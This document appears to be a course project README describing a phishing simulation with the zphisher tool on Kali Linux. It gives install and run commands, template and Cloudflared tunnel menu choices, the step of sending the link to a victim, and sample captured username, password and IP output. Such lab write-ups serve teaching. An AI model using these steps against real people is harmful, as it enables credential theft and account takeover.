
# Phishing Simulation — Beta Team
**COSC-3411 | ITAP**

A phishing simulation project demonstrating credential harvesting techniques using **zphisher v2.3.5** on Kali Linux, for educational purposes as part of the COSC-3411 course.

---

## Tool Used

**zphisher** — An automated phishing tool with 35+ login page templates. It sets up a local PHP server, tunnels it publicly via Cloudflared, and captures credentials entered by the victim.

---

## Requirements

- Kali Linux (or any Debian-based Linux)
- `git`, `php`, `curl` installed
- Internet connection (for Cloudflared tunnel)

---

## Installation

```bash
# Clone zphisher
git clone https://github.com/htr-tech/zphisher.git
cd zphisher

# Make executable
chmod +x zphisher.sh

# Run
./zphisher.sh
```

---

## Usage

### Step 1 — Launch the tool
```bash
cd zphisher
./zphisher.sh
```

### Step 2 — Select a target platform
```
[01] Facebook    [11] Twitch      [21] DeviantArt
[02] Instagram   [12] Pinterest   [22] Badoo
[03] Google      [13] Snapchat    [23] Origin
...
Select an option : 1
```

### Step 3 — Select tunneling method
```
[01] Localhost
[02] Cloudflared  [Auto Detects]
[03] LocalXpose   [NEW! Max 15Min]

Select a port forwarding service : 2
```

### Step 4 — Send the phishing link to the victim
The tool generates a public URL via Cloudflared. Send this link to the target machine.

### Step 5 — Credentials are captured automatically
```
[-] Victim IP Found !
    127.0.0.1's IP : 127.0.0.1
[-] Saved in : auth/ip.txt
[-] Login info Found !!
[-] Account  : mar
[-] Password : 123456
[-] Saved in : auth/usernames.dat
```

Captured credentials are saved to:
- `auth/usernames.dat` — username and password
- `auth/ip.txt` — victim IP address

---

## How It Works

| Phase | What Happens |
|-------|-------------|
| **Setup** | Script starts a PHP server on localhost:8080 with a cloned login page |
| **Tunneling** | Cloudflared creates a public HTTPS URL pointing to the PHP server |
| **Delivery** | Attacker sends the public URL to the victim |
| **Capture** | When victim submits credentials, PHP captures and saves them to `auth/` |

---

## Project Structure

```
zphisher/
├── zphisher.sh          # Main script — entry point
├── auth/
│   ├── ip.txt           # Captured victim IP addresses
│   └── usernames.dat    # Captured credentials
├── scripts/             # PHP login page templates (35+ sites)
├── Dockerfile           # Docker support
├── run-docker.sh        # Run via Docker
└── README.md
```

---

## Demo Screenshots

| Step | Screenshot |
|------|-----------|
| Launch & file structure | `./zphisher.sh` running on Kali |
| Target selection menu | 35+ platform options shown |
| Cloudflared tunneling | PHP server + public URL generated |
| Credential capture | Account, password, and IP saved |

---

## Ethical Use Statement

This project was implemented strictly for educational purposes as part of COSC-3411. This simulation was run in a controlled, isolated environment. Using phishing tools against real users without explicit written consent is illegal under computer crime laws in all jurisdictions.

---

## Team

**Beta Team — COSC-3411 | ITAP**

## Repository

```
https://github.com/ITAP/COSC-3411/Beta
```
